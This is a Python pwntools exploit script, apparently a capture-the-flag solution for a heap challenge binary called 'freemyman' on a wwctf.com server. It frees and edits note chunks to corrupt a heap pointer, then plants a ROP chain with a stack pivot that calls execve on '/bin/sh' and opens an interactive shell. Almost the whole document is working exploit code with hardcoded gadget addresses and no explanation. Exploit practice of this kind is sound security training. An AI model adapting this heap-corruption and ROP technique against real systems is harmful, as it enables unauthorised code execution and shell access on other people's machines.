#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "freemyman.chal.wwctf.com"
PORT = 1337
PROCESS = "./freemyman"


def add(title, content):
    r.sendline(b"1")
    r.sendlineafter(b": ", title)
    r.sendlineafter(b": ", content)
    r.recvuntil(b">> ")


def free(idx):
    r.sendline(b"4")
    r.sendlineafter(b": ", str(idx).encode())
    r.recvuntil(b">> ")


def view(idx):
    r.sendline(b"3")
    r.sendlineafter(b": ", str(idx).encode())
    r.recvuntil(b"Title: ")
    title = r.recvuntil(b"Content: ", drop=True)
    content = r.recvuntil(b"1. Add", drop=True)
    r.recvuntil(b">> ")
    return title, content


def edit(idx, title, content):
    r.sendline(b"2")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", title)
    r.sendlineafter(b": ", content)
    r.recvuntil(b">> ")


def exploit(r):
    r.recvuntil(b">> ")
    add(b"A" * 0x10, b"B" * 0x10)
    add(b"A" * 0x10, b"B" * 0x10)

    free(1)
    free(2)

    payload1 = p64(0x483618)[1:8] + p64(0xdeadbeef)
    payload2 = p64(0xfacebabe)

    edit(2, payload1, payload2)

    add(b"A" * 0x10, b"B" * 0x10)

    # 0x40296f    mov    edi,DWORD PTR [rdi+0x28]; mov rsp, qword ptr [rdi + 0x30]; jmp qword ptr [rdi + 0x38];

    STACKPIVOT = 0x40296c

    POPRAX = 0x0000000000413c23
    POPRSI3 = 0x0000000000402dac
    SYSCALL = 0x0000000000401fa7

    payload = b"/bin/sh\x00" + p64(0)
    payload += p64(0) + p64(0x483618)           # X / new rdi
    payload += p64(0x0) + p64(STACKPIVOT)       # X / stack pivot
    payload += p64(0x483660) + p64(POPRAX)      # rsp / new jmp

    payload2 = b"\x00" * 7
    payload2 += p64(59)
    payload2 += p64(POPRSI3) + p64(0)
    payload2 += p64(0) + p64(0)
    payload2 += p64(0) + p64(SYSCALL)

    add(payload, payload2)

    r.sendline(b"6")

    r.interactive()

    return


if __name__ == "__main__":
    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process("./freemyman")
        print(util.proc.pidof(r))
        pause()

    exploit(r)
